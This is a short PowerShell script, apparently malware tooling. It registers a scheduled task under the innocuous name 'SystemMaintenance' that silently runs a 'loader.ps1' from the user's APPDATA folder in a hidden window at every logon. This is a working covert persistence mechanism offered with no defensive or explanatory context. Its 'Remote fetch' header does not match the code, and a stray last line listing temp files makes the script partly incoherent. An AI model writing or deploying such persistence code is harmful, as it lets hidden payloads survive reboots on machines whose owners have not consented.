<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$TaskName = "SystemMaintenance",
    [string]$ScriptPath = "$env:APPDATA\loader.ps1"
)
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-NoP -WindowStyle Hidden -File `"" + $ScriptPath + "`"")
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
